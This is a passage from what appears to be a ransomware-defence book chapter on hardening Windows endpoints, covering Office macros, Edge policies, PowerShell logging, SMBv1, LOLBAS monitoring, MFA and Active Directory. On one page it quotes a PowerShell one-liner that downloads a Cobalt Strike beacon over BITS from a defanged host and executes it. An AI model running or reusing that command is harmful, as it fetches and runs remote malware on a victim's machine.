- pgno: 128
  md: 'If you have Microsoft 365 E5 licenses and Microsoft Defender for Endpoint enabled
    for your endpoints, you can also view any discovered vulnerabilities from the
    Microsoft 365 Defender portal. By going to `security.microsoft.com` and logging
    in to your Azure AD Administrator account, which has access to the service, and
    then going into **Vulnerability management and weaknesses**, it will list all
    software and vulnerabilities for your environment.


    While update rings and Autopatch from Microsoft can manage Windows-native applications
    and products, they do not handle updates related to third-party applications that
    you might have within your environment. To add this feature, you need to have
    a third-party product such as PatchMyPC, which supports integration with Intune
    to handle patch management for those applications.


    # Securing Microsoft Office apps


    Microsoft Office applications are an important aspect of any business, and many
    enterprises receive daily phishing attempts or malicious content as attachments
    in an email.


    As mentioned earlier, when I discussed some of the different ransomware attacks,
    many of them started as an email with a document, and when the user ran the code
    in the document, the attacker gained a foothold. One example is a ransomware variant,
    dubbed Locky, that used phishing emails containing word documents with malicious
    content. These documents were embedded with macros, so once the user clicked on
    the enabled content, the malware executable would then download an additional
    payload from a web server and begin looking for attached drives and network shares
    to encrypt.


    So, having some additional security mechanisms in place for our Office applications
    is also an important aspect of reducing the risk of ransomware attacks.


    When it comes to managing Microsoft Office applications, they can usually be done
    using the Group Policy settings, which can be found at https://www.microsoft.com/en-us/download/details.aspx?id=49030.


    Group Policy settings are the most common way to manage configuration in any AD-based
    deployment. We can also use the new cloud-based configuration services that are
    part of the Office 365 Admin Center, which have the advantage that they can be
    used to manage Office 365 regardless of whether the device is fully managed or
    not. This means that if the user is logged in with their Azure AD account, they
    will automatically apply the policies to the applications.


    Another good thing with this service is that when Microsoft creates additional
    policies, they will automatically become available within the service, so you
    are not required to download an ADMX to ensure the new policies are applied.


    It should be noted that only user-based policies are available. If you want to
    apply computer-based settings, you can use the ADMX deployment template via Intune.'
  merge: -1
  img_proc: true
- pgno: 129
  md: 'The Office 365 config service can be found at https://config.office.com/officeSettings/officePolicies,
    which I am going to use as an example of building a security baseline for Office
    applications for our users.


    In the configuration portal, go to Customization | Policy Management, and then
    click on Create to start the wizard, as shown in the following screenshot:


    ![](img/7b49a27a3c2adc52d097f2e77f3bf394_129_0.png)


    Figure 4.9 – Microsoft Office 365 config service


    Provide a name for the profile, click on Next, and select a scope. Here, we need
    to define an Azure AD Security group that consists of one or more users to which
    we want these settings to apply. Then, go into Policies, where we will get a list
    of all the policies that we can configure for our users and even a filter on the
    top that says Baseline. Here, the baseline filter will show policies that are
    part of Microsoft’s security baseline and will be our starting point.


    Many of these settings apply to a single application or to the entire Office package,
    which you can see depicted in the icon usage under Application, as shown in the
    following screenshot:


    ![](img/7b49a27a3c2adc52d097f2e77f3bf394_129_1.png)


    Figure 4.10 – Defining trusted locations in Microsoft Office config


    Here, we have a policy for Microsoft Excel and another one for the Office package
    that then applies to all Office applications. At the top of the portal, we also
    have a filter for the baseline, which filters out all policies that Microsoft
    has as part of its security baseline.


    Overall, disabling macros could impact end users who are using the functionality,
    especially in applications such as Microsoft Excel. Therefore, you might need
    to have macros to be able to run from specific network locations.


    When we specify network locations as trusted locations in Office, it also means
    that features such as the application guard are not going to be running as well.'
  merge: -1
  img_proc: true
- pgno: 130
  md: 'It should be noted that Microsoft has made some changes to all the files downloaded
    from the internet containing macros, which will be disabled by default. You can
    read more about the recent change at https://docs.microsoft.com/en-gb/DeployOffice/security/internet-macros-blocked.


    # Securing the web browser


    The most common application that users use is the web browser; while most modern
    web browsers have an elevated level of security, there are some challenges related
    to vulnerabilities. Google Chrome and Microsoft Edge, which are both built on
    the Chromium core, have had a tough time relating to a high number of vulnerabilities,
    as you can see at https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2022-001.


    While both browsers support automatic updates, it often requires a restart of
    the browser to get the update installed properly. One thing that I have seen from
    numerous projects is that end users are often quite reluctant to restart the browser;
    therefore, you also need to implement some features to ensure that those updates
    are installed.


    Another thing that is important to consider for web browsers is extensions. While
    many extensions can provide more security features such as pop-up blockers or
    ad-blockers, there are many known malicious extensions that have been used to
    collect usernames and passwords on a local machine. Therefore, it is important
    to have control over the extensions on managed endpoints.


    For both Google Chrome and Microsoft Edge, we can manage both extensions and update
    mechanisms through centralized management tools such as Intune or Group Policy.
    Both Microsoft and Google have their own ADMX files that can be used to manage
    the browser using AD with Group Policy. As an example, here, I will be using Microsoft
    Intune with the ADMX feature to deploy Microsoft Edge settings.


    > Note

    > You can view the latest list of policy settings for Microsoft Edge at https://docs.microsoft.com/en-us/deployedge/microsoft-edge-update-policies.


    The deployment of Microsoft Edge settings in Intune is done via the endpoint portal;
    go to Devices | Configuration profiles | Create a Profile and then under Profile
    type, select Templates. From there, select Administrative Templates, as shown
    in the following screenshot:'
  merge: -1
  img_proc: true
- pgno: 131
  md: '# Create a profile


    Platform

    Windows 10 and later


    Profile type

    Templates


    Templates contain groups of settings, organized by functionality. Use a template
    when you don''t want to build policies manually or want to configure devices to
    access corporate networks, such as configuring WiFi or VPN. Learn more


    Search


    Template name

    Administrative templates


    Figure 4.11 – Configuration of administrative templates in Endpoint Manager


    Then, click on Create. Provide a name for the profile. Then under Configuration
    settings, you should see several different setting names, including Google and
    multiple Microsoft Edge entries.


    First, let us look at the update settings to ensure that Edge will automatically
    update and automatically restart after a certain time:


    +   - **Update policy override default** – This ensures that **Always Allow Updates**
    is enabled.

    +   - **Auto-update check period override** – This defines how often it should
    check for new updates.

    +   - **Set the time for update notifications** – This sends the user notifications
    about requiring a restart to install a pending update that shows a period.

    +   - **Notify a user that a browser restart is recommended or required for pending
    updates** – This shows the user that a browser is recommended or required. Here,
    you should define the setting as required. This ensures that the browser is restarted.

    +   - **Set the time interval for relaunch** – Here, we specify the amount of
    time that should elapse before the browser restarts following the expiration of
    the update notification period. If we do not define a setting here, the default
    value is between 2 AM and 4 AM. The setting here is defined as XML, which looks
    like this:


    ```

    {"entries": [{"start": {"hour": 0, "minute": 0},

    "duration_mins": 240}]}

    ```


    This example defines that the restart should happen after hour 0, which is midnight.
    However, this policy is only to control browser restarts that happen within a
    certain time window. If'
  merge: -1
  img_proc: true
- pgno: 132
  md: 'most of your endpoints are laptops or mobile workers, the chances are that
    most endpoints are offline at midnight. This policy is only useful if you know
    your endpoints are online such as stationary machines.


    It should be noted that Edge, as a browser, receives a lot of security updates
    on a regular basis, as you can see here: https://docs.microsoft.com/en-us/deployedge/microsoft-edge-relnotes-security.


    In addition to defining update features, there are also other settings that should
    be configured as enabled by default:


    +   - Configuring Microsoft Defender SmartScreen

    +   - PUA blocking with Microsoft Defender SmartScreen

    +   - Blocking external extensions from being installed

    +   - Controlling which extensions cannot be installed

    +   - Allowing specific extensions to be installed

    +   - Controlling which extensions are installed silently


    The first two settings are just to ensure that SmartScreen is enabled and working
    as intended. You can use the https://demo.smartscreen.msft.net/ testing site from
    Microsoft to verify that it is working. By entering the website and clicking on
    one of the tests, such as Malware Page, you should get a message from SmartScreen
    stating that the website is marked as dangerous if it is working.


    The last ones in the list are for enabling control over extensions. This prevents
    users from installing extensions independently and only allows the installation
    of pre-approved extensions, such as those we desire to install.


    With the last point on the list, we can define what kind of extension we want
    Edge to automatically install. For example, I tend to install the AdBlock extension
    using the policy, and here, I need to enter the extension/app IDs, which can be
    found on the website of each extension on the Microsoft Edge Webstore. As you
    can see for AdBlock at the Edge webstore (https://microsoftedge.microsoft.com/addons/detail/adblock-%E2%80%94-best-ad-blocker/ndcileolkflehcjp
    mjnfbnaibdcgglog), if I want this to be automatically installed on my devices,
    I need to add the app ID of the extension in the policy, as shown in the following
    screenshot:


    ![](img/7b49a27a3c2adc52d097f2e77f3bf394_132_0.png)


    Figure 4.12 – The configuration of Microsoft Edge extensions in Endpoint Manager'
  merge: -1
  img_proc: true
- pgno: 133
  md: 'The application ID is the last part of the URL for the Microsoft Edge webstore.
    The same would apply if we wanted to install extensions for Google Chrome.


    Once the policy is applied to a device, the user will notice that Microsoft Edge
    is managed by your organization if they open the Settings window, as shown in
    the following screenshot:


    ![](img/7b49a27a3c2adc52d097f2e77f3bf394_133_0.png)


    Figure 4.13 – Managed browser by Endpoint Manager


    This implies that Microsoft Edge has policies applied to it from a management
    service such as Group Policy or Microsoft Endpoint Manager.


    While the example mentioned earlier allows us to maintain control of the browser
    on end-user machines, there are also other ways to provide a secure browser using
    managed services, such as the following:


    +   - Citrix Browser Service

    +   - Cloudflare Browser Isolation

    +   - CheckPoint Harmony Browse


    Most of these services provide a managed browsing service that is integrated into
    a threat intelligence service to provide a safer browsing experience. The introduction
    of these services is because it is becoming more and more difficult to provide
    network-based security mechanisms, as we have been doing traditionally with the
    introduction of new web protocols, such as HTTP/3, which does not allow direct
    inspection. This means that we need to move the security into the user layer to
    provide the same level of security.


    # Other miscellaneous endpoint countermeasures


    So far, we have focused much on adding additional layers with new security mechanisms
    and implementing patch management for systems and common business applications.


    However, there are other settings we should implement to further reduce the overall
    risk of getting a compromised endpoint or a compromised endpoint that could be
    used to launch an attack against our infrastructure. So, here is a list of other
    miscellaneous countermeasures we can implement for our endpoints.'
  merge: -1
  img_proc: true
- pgno: 134
  md: '# ## DNS filtering


    On a monthly basis, there are over 200,000 **New Domain Registrations (NDRs)**.
    Palo Alto identifies that the majority of these domains are used for suspicious
    or malicious intent, as we can see from the research at `https://unit42.paloaltonetworks.com/newly-registered-domains-malicious-abuse-by-bad-actors/`.


    Palo Alto also advises us to block these NDRs up to 32 days (about 1 month) after
    initial registration. So, this requires some DNS filtering capabilities to ensure
    that we can block out these DNS lookup requests directly from the client. It might
    be that a user gets a phishing email that then redirects the user to a phishing
    website to get the user to enter their credentials. Having a DNS filtering service
    on the client could prevent the user from getting to the phishing site since the
    DNS request would get blocked.


    There are two good options to choose from when it comes to DNS filtering capabilities
    as a single service, OpenDNS or Cloudflare.


    Both vendors provide public DNS resolver services with an additional capability
    to block certain domains based on content, which you can read more about at `https://developers.cloudflare.com/1.1.1.1/setup/#1111-for-families`.


    They also have commercial options; for instance, OpenDNS has Umbrella and Cloudflare
    has Cloudflare Access where you can define DNS filtering on a much more granular
    level.


    # ## PowerShell


    PowerShell scripts are also commonly used during ransomware attacks, either to
    do reconnaissance or to download the malware payload to do in-memory-based attacks.


    For example, here is a recently used PowerShell that was used to trigger a BITS
    transfer job to download a cobalt strike beacon:


    ```

    ```powershell

    powershell.exe  -nop -c "start-job { param($a) Import-Module BitsTransfer; $d
    = $env:temp + ''\'' + [System.IO.Path]::GetRandomFileName(); Start-BitsTransfer
    -Source ''hxxp://x.x.x.x/a'' -Destination $d; $t = [IO.File]::ReadAllText($d);
    Remove-Item $d; IEX $t } -Argument 0 | wait-job | Receive-Job"

    ```

    ```


    There are a couple of settings that we can configure to ensure that we have some
    higher security on PowerShell for our endpoints.


    By default, on Windows 10 and Windows 11, PowerShell v2 is installed. V2 is an
    old version, and one thing that should be done is upgrading to the latest version
    where needed. At the time of'
  merge: -1
  img_proc: true
- pgno: 135
  md: 'writing this book, the latest version is 7.2, which can be found at https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-windows?view=powershell-7.2.


    Second, we should enable some additional logging mechanisms on the PowerShell
    engine to monitor for suspicious activity. This requires that we are collecting
    our endpoint''s event logs to be able to monitor for abnormal use of PowerShell.
    These logs should be collected to a centralized log service using a SIEM tool
    or product such as Microsoft Sentinel. It should also be noted that Defender for
    Endpoint and other EDR products also provide insight into the usage of PowerShell
    cmdlets and modules.


    In PowerShell, we have the following log mechanisms:


    +   - **Engine lifecycle logging** – This allows PowerShell to log the startup
    and termination of the PowerShell session on the device. If it is running PowerShell
    higher than version 5, it will also log command-line arguments. By default, engine
    lifecycle logging is enabled and can be accessed in the event viewer under Applications
    and Services Logs\Microsoft\Windows\PowerShell\Operational log.

    +   - **Module/pipeline logging** – Starting with PowerShell version 3.0, it is
    possible to log pipeline events to Windows Event Logs on a module-by-module basis
    or globally. This feature can be enabled through Group Policy or using Endpoint
    Manager.

    +   - **Script block tracing** – With version 5.0, it is possible to log detailed
    information, including the code that was run, to the event log. This output can
    provide insight into the actions taken by the system.


    Now, by default, PowerShell should be set to only allow signed scripts. However,
    it is important to note that there are numerous methods of bypassing the script
    execution policy, so this is just one small part of defining security in PowerShell.


    Many ransomware attacks also leverage PowerShell to download additional payload
    as well as use commands such as invoke-webrequest.


    Invoke-WebRequest is a PowerShell cmdlet that allows you to send HTTP and HTTPS
    requests to a web page or web service. It can be used to download the contents
    of a web page, download files from a web server, and upload data to a web server.


    When used in the context of ransomware, it can be used to download and execute
    malware payloads or scripts from a command and control server, thereby allowing
    an attacker to remotely control the compromised system. Additionally, it''s used
    to exfiltrate sensitive data from the victim''s network.


    In terms of PowerShell, there is also additional guidance available from NSA and
    CSI, which can be found here: https://media.defense.gov/2022/Jun/22/2003021689/-1/-1/1/CS
    I_KEEPING_POWERSHELL_SECURITY_MEASURES_TO_USE_AND_EMBRACE_20220622.PDF.'
  merge: -1
  img_proc: true
- pgno: 136
  md: 'The configuration of PowerShell logging can either be done using Group Policy
    or using Microsoft Intune.


    The deployment of PowerShell settings in Intune is done via the endpoint portal,
    under **Devices | Configuration profiles, Create Profile**, and the profile type
    of **Templates**. From there, select **Administrative Templates** and then select
    **Windows PowerShell** from the list, as shown in the following screenshot.


    Then, define the policy, as shown in the following screenshot:


    ![](img/7b49a27a3c2adc52d097f2e77f3bf394_136_0.png)


    Figure 4.14 – The PowerShell configuration in Endpoint Manager


    This ensures that all modules are logged using * as a wildcard and that PowerShell
    will monitor script blocks and set the execution policy to only allow signed scripts.


    It should be noted that enabling only signed scripts can result in many components
    stopping working since not all vendors are signing their PowerShell modules.


    # SMB protocol


    The SMB protocol has also been used in ransomware attacks, where they have leveraged
    vulnerabilities in older versions of the protocol to gain access.


    This especially applies to SMB v1, which Microsoft wants to remove completely.
    In Windows 11 (and from Windows 10 version 1709), it is disabled by default, but
    still, it can be installed using add/remove features.'
  merge: -1
  img_proc: true
- pgno: 137
  md: 'However, it is still present on older versions of Windows; therefore, it should
    be uninstalled. You can check whether the feature is present by running the following
    command using Windows PowerShell:


    ```

    Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

    ```


    Additionally, you can run the following command to disable the feature from the
    operating system:


    ```

    Disable-WindowsOptionalFeature -Online -FeatureName

    SMB1Protocol

    ```


    Of course, you might have older file servers or NAS services that lack support
    for newer versions, but Microsoft has provided a lot of documentation and troubleshooting
    tips that you can read about here: https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/smbv1-not-installed-by-default-in-windows.


    Regarding centrally disabling SMBv1 using services such as Endpoint Manager, this
    can be done using a custom OMA-URI configuration since we do not have a UI option
    currently available. This is by using the MSSecurityGuide/ConfigureSMBv1ClientDriver
    OMA-URI (which is only available for Windows 10 and Windows 11 OS).


    The deployment of custom OMA-URI settings in Intune is done via the endpoint portal.
    Under Devices | Configuration Profiles | Create Profile, select Templates under
    Profile type, and then select Custom, as shown in the following screenshot. Then,
    click on Create:


    ![](img/7b49a27a3c2adc52d097f2e77f3bf394_137_0.png)


    Figure 4.15 – Custom configuration settings in Intune


    This will open the custom profile wizard, which will allow us to define the setting
    we want to add. Provide a name for this configuration profile such as SMBClientsettings
    and then go to the Configuration settings section and click on Add.'
  merge: -1
  img_proc: true
- pgno: 138
  md: 'Then, enter the following under the different dialog boxes:


    +   - **Name:** ConfigureSMBV1ClientDriver

    +   - **OMA-URI:** ./Vendor/MSFT/Policy/Config/MSSecurityGuide/ConfigureSMBV1Server

    +   - **Data type:** String

    +   - **Value:** <enabled/>

    +     <data id="Pol_SecGuide_SMB1ClientDriver" value="4"/>


    Now, click on **Save | Next**. Then, we need to define an assignment group. This
    refers to a group of machines to which we aim to apply the OMA-URI setting. However,
    disabling SMBv1 should be done on all machines within your infrastructure. It
    should be applied to all devices, which can be done by using the **Add all devices**
    option.


    This will disable the SMBv1 client driver on the operating systems where this
    policy will apply. It should be noted that it will only apply to devices that
    are enrolled in Endpoint Manager; servers that are not managed by Endpoint Manager
    should be done manually. This is also to ensure that there are no legacy devices
    or services that rely on older SMB versions within your environment.


    # LOLBAS


    **LOLBAS** is the abbreviation for **Living Off the Land Binaries and Scripts**,
    which are binaries of a non-malicious nature and local to the operating system.
    Often, these might be Microsoft-signed binaries such as certutil or features such
    as WMIC, which can be used for a wide range of attacks.


    You can find an updated list of LOLBAS binaries at https://lolbas-project.github.io/.


    The challenge lies in defending against the exploitation of these binaries in
    attacks, as many of these binaries are a core part of the operating system. One
    important thing is to monitor the usage of these binaries across our endpoints,
    which can be done using a couple of methods.


    The first option is to use Sysmon, which is a tool that is part of the Microsoft
    Sysinternals package. The issue with Sysmon is that we need to define what kind
    of binaries we want to monitor, which can take a lot of time. Luckily, someone
    has created a predefined template for Sysmon that can monitor all these binaries
    and can be downloaded from https://github.com/SwiftOnSecurity/sysmon-config.


    In addition, you need to download Sysmon from https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
    and run it together with the XML file using the following command:


    ```

    sysmon.exe -accepteula -i sysmonconfig-export.xml

    ```'
  merge: -1
  img_proc: true
- pgno: 139
  md: 'Then, Sysmon will start to monitor the changes and report them to the Windows
    EVENT VIEWER under Application and Services | Microsoft | Windows | Sysmon | Operational.


    This can then be collected using a central log service such as Azure Log Analytics
    with Microsoft Sentinel or third-party tools such as ELK or Graylog. This allows
    us to monitor the use of these binaries. I tend to use this approach to collect
    the logs from endpoints and combine that with analytics rules in Sentinel to monitor
    the usage of these binaries on endpoints.


    A second option is to use an EDR tool such as Microsoft Defender for Endpoint,
    which also collects the usage of all processes on endpoints that you can then
    define custom monitoring rules for. This requires Microsoft E5 licenses to be
    able to use it.


    Additionally, we can use Kusto queries to look for usage of these LOLBAS executables,
    with the following example query:


    ```

    DeviceProcessEvents

    | where Timestamp > ago(7d)

    and InitiatingProcessFileName =~ ''mshta.exe''

    ```


    The preceding query looks at the DeviceProcessEvents table in Microsoft Defender
    for Endpoint. The DeviceProcessEvents table stores information about all the processes
    that have been running on an endpoint. This allows us to make a list of all the
    LOLBAS executables and even make a custom detection rule.


    # Default applications


    One of the easiest customizations that can be done is to change the default file
    association on endpoints. For instance, HTML applications and JavaScript files
    are, by default, opened in the web browser. These can be files used to deliver
    malware, so an easy fix is to ensure that these types of files do not open in
    the browser by default, which can run the code in the context of the system, but
    in Notepad instead.


    Some of the files that we should change the file type association for include
    the following:


    +   - .bat, .hta, .js, .jse, .jsc, .sct, .slk, .vb, .vbe, .vbs, .wsc, .wsf, and
    .wsh


    If using Intune, there is no straightforward way of changing this directly. First,
    you need a reference machine where you define that these file types should be
    set to open in Notepad. Then, you need to export that file type association using
    the following command:


    ```

    Dism /Online /Export-DefaultAppAssociations:"<pathname/filename.xml>"

    ```


    Then, open the XML file and copy out the content. Next, go to https://www.base64encode.org/
    and copy in the content and click on the Encode button.'
  merge: -1
  img_proc: true
- pgno: 140
  md: 'Following this, we need to deploy a custom OMA-URI config. This is done via
    the endpoint portal, under **Devices | Configuration profiles | Create profile**.
    Select **Templates** under **Profile type**, and then select **Custom** from the
    list and click on **Create**. Then, as we did in the previous example, we need
    to define the custom settings under **Configuration settings**. Here, click on
    **Add** and add the following under **OMA-URI Settings:**


    +   - **Name:** DefaultAssociationsConfiguration

    +   - **OMA-URI:** ./Vendor/MSFT/Policy/Config/ApplicationDefaults/DefaultAssociationsConfiguration

    +   - **Value:** Base64 encoded value


    It should look like the following screenshot:


    ![](img/7b49a27a3c2adc52d097f2e77f3bf394_140_0.png)


    Figure 4.16 – Default file association with Endpoint Manager


    Once the endpoint policy has been updated, it should reflect the file type associated.
    It should be noted that this is not an extensive list of security settings that
    you can configure and use on your endpoints to provide a higher level of security.


    I also want to highlight some more articles and blog posts where you can read
    more about additional safeguards to use, such as https://adsecurity.org/?p=3299.'
  merge: -1
  img_proc: true
- pgno: 141
  md: '# Securing user identity


    Thus far, the emphasis of this chapter has been on securing the endpoint, which
    is often the starting point for ransomware attacks. So, what if the endpoint still
    gets compromised? Well, we also need to have safeguards in place to ensure that
    our account or credentials are not used for the attacker to do lateral movement
    in the network.


    Another part is ensuring that the external services we are using are also protected
    with multifactor authentication to ensure that attackers cannot do brute-force
    attacks or simple credential injections to gain access to our services.


    Lastly, we will also be looking at how we can protect our AD domain from known
    attacks.


    Microsoft has stated before that 99.9% of all identity-based attacks would have
    been averted if the companies had implemented **Multi-Factor Authentication (MFA)**.
    Therefore, the first thing we need to investigate is how to implement a common
    MFA service across our services.


    It should be noted that in the following example, I will be using Azure MFA and
    additional Azure AD services to provide MFA to services, which requires that you
    have, at the very least, Azure AD P1 licenses before you can use the functionality.


    Most companies have a combination of on-premises and cloud-based services with
    different points of identity integration that might make it a bit difficult to
    use the same MFA provider for all different services. One of the more common implementations
    I see is companies that have services, as you can see in the following screenshot:


    ![](img/7b49a27a3c2adc52d097f2e77f3bf394_141_0.png)


    Figure 4.17 – MFA configuration for services'
  merge: -1
  img_proc: true
- pgno: 142
  md: 'As an example, Office 365 is integrated directly with Azure AD and other SaaS
    services typically support Azure AD for identity integration.


    Then, we have on-premises services such as VPN Gateway, Citrix, or VMware-based
    VDI services or other web applications that we need to provide in a secure manner
    to our end users with MFA.


    Cloud services that use a native integration against Azure AD such as SAML mean
    that authentication will happen in Azure AD. Therefore, we can use the MFA service,
    Conditional Access, to ensure secure authentication.


    For on-premises resources that might not support Azure AD directly, we have a
    couple of options. For instance, if we have on-premises resources that support
    RADIUS, which most network-based services do, we can use a component called Windows
    NPS Extension for Azure MFA. This is a software component that you install on
    a Windows Server running NPS, which will then act as a RADIUS server for other
    components integrated with network-based appliances such as Citrix NetScaler,
    Palo Alto VPN, and more.


    This service can also be used with an on-premises RDS Gateway deployment using
    the NPS extension. I am not going to cover that NPS extension installation here,
    but you can find the documentation from Microsoft on how to set it up at `https://docs.microsoft.com/en-us/azure/active-directory/authentication/how-to-mfa-nps-extension`.


    Note that using the NPS extension to handle the MFA prompt via RADIUS does not
    support the variety of security mechanisms provided by Conditional Access. To
    ensure seamless integration with Azure AD and its security mechanisms, ensure
    that all implemented services, be they web-based, network-based, or VDI services,
    support SAML at a minimum.


    For instance, the following is an example of HP Aruba that integrates with Azure
    AD for SAML SSO: `https://www.arubanetworks.com/techdocs/central/latest/content/nms/policy/ca-azure.htm`.


    Once you have applications that are integrated with Azure AD, you can use Conditional
    Access rules to define what conditions need to be in place before a user is allowed
    to access an application or service.


    So, let us configure an example conditional access rule that will require all
    users to log in with MFA to Office 365. It should be noted that Conditional Access
    requires you to have Azure AD P1 licenses enabled for your organization and that
    you have adequate permissions to configure policies.


    Log in to the Azure portal, go to the **Azure Active Directory | Security** tab,
    and then select **Conditional access**. Microsoft has now included predefined
    templates that we can use to configure MFA more easily. However, for this example,
    we will go through the default wizard.


    Click on **New policy** and then select **Create New Policy**.


    Within each conditional access, we have a set of assignments and access control
    mechanisms that we can define:'
  merge: -1
  img_proc: true
- pgno: 143
  md: '+   - **Users or workload identities** – This allows us to define to whom this
    policy should apply. This can either be users or groups or it can be workload
    identities that are service principals. Additionally, we can define exclude rules,
    for instance, saying that a rule should apply to all users except certain users.

    +   - **Cloud apps or actions** – This allows us to define which application or
    action this policy should apply to. For instance, an application could be Office
    365, or it could be for user actions such as joining a device to Azure AD.

    +   - **Conditions** – This contains multiple sets of attributes that we can define
    such as user risk, sign-in risk, device platforms, locations, client apps, and
    device filters. An example could be allowing users with low risk to sign in from
    Windows-based devices in a specific location.

    +   - **Grant** – In the previous sections, we defined the users/groups, which
    service or application, and finally, the conditions that need to be met. Now we
    need to determine what kind of action needs to be taken to provide them with access
    if they fulfill the requirements. Here, we also have a list of different settings
    that can be defined:

    +     - Requirement for MFA

    +     - Require the device to be marked as compliant

    +     - Require a Hybrid Azure AD joined device

    +     - Require an approved client app

    +     - Require an app protection policy

    +     - Require a password change

    +   And we can define whether we want all these controls enabled or just one of
    the select controls, for the users that are logging in.

    +   - **Session** – This is meant to control the actual session that the user
    has with the service or application that they are signing in to. Here, we can
    define the following:

    +     - Using app-enforced restrictions

    +     - Using Conditional Access App Control

    +     - Signing-in frequency

    +     - Persistent browser session

    +     - Customizing continuous access evaluation

    +     - Disabling resilience defaults

    +   Now, let us try to visualize what a policy might look like:'
  merge: -1
  img_proc: true
- pgno: 144
  md: '![](img/7b49a27a3c2adc52d097f2e77f3bf394_144_0.png)


    Figure 4.18 – Overview of Conditional Access policies


    Figure 4.17 visualizes a policy where a user called John is trying to access Office
    365. We have a predefined Conditional Access policy that applies to all users
    who are trying to log in to Office 365. Here, we have two criteria for those wanting
    to log in, which is that we require MFA and that the device is marked as compliant
    with the compliance settings that are coming in from Intune. Device compliance
    is an important aspect since we do not want compromised endpoints logging into
    our Office 365 environment.


    It should be noted that for newer Azure AD tenants, Microsoft has automatically
    enabled a feature called security defaults, which is a set of basic security mechanisms
    that are automatically enforced. This feature needs to be disabled before you
    can start using Conditional Access policies. This can be done by going into the
    Azure Active Directory menu in the portal, then into Properties | Manage security
    defaults, and setting the enable security defaults option to No.


    When we have created and enabled this policy for our tenant, the sign-in process
    for the user will look like the following screenshot:'
  merge: -1
  img_proc: true
- pgno: 145
  md: '![](img/7b49a27a3c2adc52d097f2e77f3bf394_145_0.png)


    Figure 4.19 – User configured for MFA


    This will go through the process of setting up MFA for the user. By default, it
    will provide a setup wizard for using the Microsoft MFA authenticator app or using
    the phone with an SMS-based One-Time Passcode (OTP).


    As tenant administrators, we can also define what kind of MFA mechanisms we want
    our users to have access to as part of the initial registration process. This
    can be customized by going into the Azure AD | Security | MFA menu and clicking
    on the options for Additional cloud-based MFA settings, which will redirect you
    to a new portal. Here, you have the option to define authentication methods at
    the bottom such as the following:


    +   - Call to phone

    +   - Text message to a phone

    +   - Notification through a mobile app

    +   - Verification code from mobile app or hardware token


    If we only have the two last options enabled, the end user will need to use the
    software app to enable MFA authentication and be able to log in.


    Additionally, it should be noted that Microsoft supports authentication to Azure
    AD using FIDO2 Security keys. This allows for the MFA authentication to happen
    using a physical key on the device instead of using an MFA app or an OTP key.'
  merge: -1
  img_proc: true
- pgno: 146
  md: "As of 27 February 2022, Microsoft started enforcing number matching on Azure\
    \ MFA to reduce the amount of MFA fatigue attacks. This means that when you wanted\
    \ to authenticate, you will need to enter the number you see on the screen on\
    \ your authenticator device.\n\nThis provides some additional benefits since it\
    \ does not require a mobile device to handle the MFA process. Secondly, it is\
    \ not susceptible to phishing attacks.\n\nNow, there are some features we have\
    \ not discussed in this book that are related to the use of Microsoft Defender\
    \ for Cloud Apps and Conditional Access App Control. One feature, called **Session\
    \ App Control**, allows us to route web traffic for certain users or specific\
    \ applications through a proxy component provided by Microsoft.\n\nI will not\
    \ go into more details in this book, but this is a feature that can be configured\
    \ using Conditional Access. You can read more about the feature at `https://learn.microsoft.com/en-us/defender-cloud-apps/proxy-intro-aad`.\n\
    \n# Securing Active Directory\n\nSo far, we have looked at setting up MFA for\
    \ external services such as VPN, RDP, and VDI services, and lastly, Azure AD-integrated\
    \ services.\n\nHowever, when it comes to regular services that are integrated\
    \ into an Active Directory domain such as file services, print services, or the\
    \ actual login process from a Windows endpoint to Active Directory, there is no\
    \ built-in MFA service or mechanism. So, if an attacker manages to compromise\
    \ an endpoint that is connected to Active Directory, they can use that to access\
    \ file shares and such without requiring any MFA.\n\nThere are some third-party\
    \ vendors that provide MFA services on top of Windows and Active Directory such\
    \ as AuthLite. However, the main parts for securing Active Directory are listed\
    \ as follows:\n\n+   - Ensure there is no direct internet access for domain controllers\
    \ (or other internal servers that do not require it; this ensures that servers\
    \ can be used in combination with known tools such as TeamViewer or Anydesk, which\
    \ ransomware operators often use).\n+   \n+   - Ensure that non-critical services\
    \ are disabled by default. You can read the list of recommendations from Microsoft\
    \ in regard to what services should be disabled by default: `https://docs.microsoft.com/en-us/windows-server/security/windows-services/security-guidelines-for-disabling-system-services-in-windows-server`.\n\
    +   \n+   - Ensure that RDP access to domain controllers is only allowed from\
    \ controlled systems such as secure administrative hosts and approved security\
    \ accounts. This requires enabling firewall rules to ensure only RDP from the\
    \ approved hosts and using Group Policy to deny logins from other groups besides\
    \ the admin group. This is a group policy setting under **Computer Configuration\
    \ | Windows Settings | Security Settings | Local Policies | User Rights assignments**.\
    \ From there, find the **Deny log on through remote desktop services** setting."
  merge: -1
  img_proc: true
- pgno: 147
  md: '+   - We also have another feature in Active Directory called **time-based
    group membership**. This is a feature that is not enabled by default since it
    requires the forest function level to be 2016. To enable the feature, you will
    need to run the following command:


    ```

    Enable-ADOptionalFeature ''Privileged Access Management Feature'' -Scope ForestOrConfigurationSet
    -Target forest.com

    ```


    Then, we can use the following command to temporarily add a member to a group
    for 15 minutes:


    ```

    Add-ADGroupMember -Identity ''Domain Admins'' -Members ''peter'' -MemberTimeToLive
    (New-TimeSpan -Minutes 15)

    ```


    This is also useful to ensure that we are using least privilege access rights.


    +   - For Azure-based deployments, where we have virtual infrastructure running
    in Azure, we also have the option of using a feature called **Azure Bastion**.
    This allows us to log on to virtual machines using the Azure web portal. Azure
    Bastion supports remote management to Windows using RDP and Linux using SSH. It
    should be noted that Azure Bastion is a separate service and is not deployed by
    default.


    +   - Ensure that administrators have a minimum of two accounts, where they have
    one regular user and another that is used for administrative purposes to manage
    the environment. This is to ensure that if the administrator account or endpoint
    gets compromised, it will not affect the Active Directory domain admin account.


    +   - Enable LSA protection. This setting applies to all Windows operating systems
    and ensures that you cannot attach a debugger to the LSASS process and stops common
    tools such as Mimikatz from accessing the process. You can read more about how
    to enable the feature at https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection.


    +   - Ensure that critical security patches are installed on domain controllers.
    As I mentioned in the first chapter, some ransomware attacks have been exploiting
    vulnerabilities such as Zerologon to gain access to the domain controllers. While
